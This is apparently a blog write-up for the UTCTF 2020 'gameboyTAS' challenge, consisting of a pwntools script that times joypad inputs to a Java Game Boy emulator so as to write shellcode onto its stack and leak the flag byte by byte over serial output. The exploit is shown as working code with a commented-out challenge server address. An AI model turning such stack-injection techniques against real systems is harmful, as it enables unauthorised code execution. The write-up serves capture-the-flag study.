---
layout: post
title: "[UTCTF 2020] gameboyTAS"
author: Escher
---
For a more detailed writeup, click [here](https://www.danbrodsky.me/writeups/utctf2020-gameboytas/).


```py
from pwn import *
import re

ROUTINE_OFFSET = 322
UART = 0x01
LDH_a8_A = 0xE0
NOP = 0x00
FLAG_START = 0x12
LD_C_d8 = 0x0E
LD_A_aBC = 0x0A
INC_D = 0x13

# nops cost 4 cycles
NOP_COST = 4


char = "a"
# 16-bit architecture so we write 2 bytes to the stack each time
def write_short(byte1, byte2):
    global char
    short = int(str(hex(byte1)[2:]) + str(hex(byte2)[2:].rjust(2, "0")), 16)
    cycles = (short - ROUTINE_OFFSET - 2) * NOP_COST
    r.recvuntil("Please enter your next command: ")
    r.sendline(char + " " + str(cycles))
    char = chr(ord(char) ^ ord("b") ^ ord("a")) # toggle joypad inputs to trigger new interrupts


out = ""
def run_shellcode():
    global out
    global char
    r.clean(0)
    r.sendline(char + " 32000") # 32000 cycles is enough to execute the entire stack
    res = r.clean(1).decode("ISO-8859-1")
    print(res)
    out += re.search("d: (.)P", res).groups()[0]


for _ in range(30):
    r = process(["/usr/bin/java", "com.garrettgu.oopboystripped.GameBoy"])
    # r = remote("3.91.17.218", 9002)

    # shellcode is written in reverse order since stack grows upwards (to smaller addresses)
    # but code is executed downwards (to larger addresses)
    payload = [
        UART, LDH_a8_A,
        INC_D, LD_A_aBC,
        INC_D, FLAG_START,
        LD_C_d8, NOP,
    ]
    r.sendline("a 256") # write some trash to get init routine offset out of the way
    r.sendline("b 256")

    for s in range(0, len(payload), 2):
        write_short(payload[s], payload[s + 1])

    run_shellcode()
    FLAG_START += 1 # get the next flag character
    char = "a"
    r.close()
```